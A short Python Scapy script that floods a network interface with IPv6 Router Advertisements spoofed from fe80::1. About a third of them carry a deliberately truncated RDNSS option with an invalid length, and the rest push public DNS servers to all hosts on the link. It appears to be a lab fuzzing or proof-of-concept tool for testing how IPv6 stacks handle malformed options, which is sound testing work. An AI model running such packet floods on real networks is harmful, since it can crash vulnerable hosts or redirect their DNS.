#!/usr/bin/env python3
from scapy.all import (
    Ether, IPv6, sendp, get_if_hwaddr,
    ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
    ICMPv6NDOptRDNSS, conf
)
import time, random, argparse

def good_rdnss(dns_list=None, lifetime=600):
    if dns_list is None:
        dns_list = ["2001:4860:4860::8888", "2606:4700:4700::1111"]
    return ICMPv6NDOptRDNSS(dns=dns_list, lifetime=lifetime)

def bad_rdnss_len1(lifetime=600):
    # Scapy enforces valid length, so we craft a valid RDNSS and then truncate to 8 bytes
    opt = ICMPv6NDOptRDNSS(dns=["2001:db8::53"], lifetime=lifetime)
    raw = bytes(opt)
    return raw[:8]  # type(1), len(1), reserved(2), lifetime(4) -> Length=1 (invalid)

def ra_pkt(iface, bad=False):
    src_ll = get_if_hwaddr(iface)
    base = Ether(dst="33:33:00:00:00:01")/IPv6(src="fe80::1", dst="ff02::1")/ICMPv6ND_RA()
    sll  = ICMPv6NDOptSrcLLAddr(lladdr=src_ll)
    if bad:
        hacked = bad_rdnss_len1(lifetime=random.choice([60,120,300]))
        return (base/sll)/hacked
    else:
        opt = good_rdnss(lifetime=random.choice([300,600,1200]))
        return base/sll/opt

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-i","--iface", required=True, help="Host-only interface (e.g.e eth0)")
    ap.add_argument("-n","--count", type=int, default=60, help="Packets to send")
    ap.add_argument("--interval", type=float, default=0.25, help="Seconds between packets")
    args = ap.parse_args()

    conf.iface = args.iface
    for idx in range(args.count):
        pkt = ra_pkt(args.iface, bad=(idx % 3 == 0))  # ~33% malformed
        sendp(pkt, iface=args.iface, verbose=False)
        time.sleep(args.interval)

if __name__ == "__main__":
    main()
